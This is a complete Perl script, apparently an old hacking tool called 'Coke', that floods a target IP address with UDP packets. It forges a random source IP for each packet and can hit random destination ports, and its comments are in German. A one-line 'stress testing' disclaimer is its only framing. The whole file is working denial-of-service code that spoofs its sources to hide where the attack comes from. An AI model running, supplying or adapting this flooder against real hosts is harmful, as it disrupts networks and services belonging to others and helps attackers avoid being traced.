#!/usr/bin/perl
# Coke - A spoofing UDP flooder
# Use only for stress testing network devices.
# 4/30/2008 - nwo
#
use Net::RawIP;

# Input Parameter einlesen und anhand Space in einzelne Strings splitten
($dest, $size, $count, $port) = split(/\s+/, "@ARGV");
$opt = @ARGV;
if($opt < 4) {
    print "Usage: $0 (ip) (size) (amount) (port)\n";
    print "If port is \’0\’, random destination ports will be hit.\n";
    exit(0);
}
if($size > 736) {
    print "Packet size must be below 736 bytes.\n";
    exit(0);
}
for(1..$size){
    push @{$DATA},"A"     # Payload (Array) mit “A” Characters füllen
}
if($port eq "0") {
    print "+----------------------------------+\n";
    print "Destination: $dest\n";
    print "Source: Random\n";
    print "Port: Random\n";
    print "Packet size: $size\n";
    print "Amount: $count\n";
    print "+----------------------------------+\n";
    while($i <= $count) {
        # Zufällige IP Adresse als Quelle generieren
        $saddr = join(".", map int rand 256, 1 .. 4);
        $rsport = int rand(65535);
        $rport = int rand(65535);
        $packet = Net::RawIP->new({     # Erstellen des Pakets (UDP + IP)
            ip => {
                saddr => $saddr,
                daddr => $dest,
            },
            udp => {
                source => $rsport,
                dest => $rport,
                data => "@{$DATA}",
            },
        });
        $packet->send;    # Versand des Pakets über verbundenes Interface
        $i++;
    }
    exit(0);
}
print "+----------------------------------+\n";
print "Destination: $dest\n";
print "Source: Random\n";
print "Port: $port\n";
print "Packet size: $size\n";
print "Amount: $count\n";
print "+----------------------------------+\n";
while($i <= $count) {
    # Zufällige IP Adresse als Quelle generieren
    $saddr = join(".", map int rand 256, 1 .. 4);
    $rsport = int rand(65535);
    $packet = Net::RawIP->new({
        ip => {
            saddr => $saddr,
            daddr => $dest,
        },
        udp => {
            source => $rsport,
            dest => $port,
            data => "@{$DATA}",
        },
    });
    $packet->send;     # Versand des Pakets über verbundenes Interface
    $i++;
}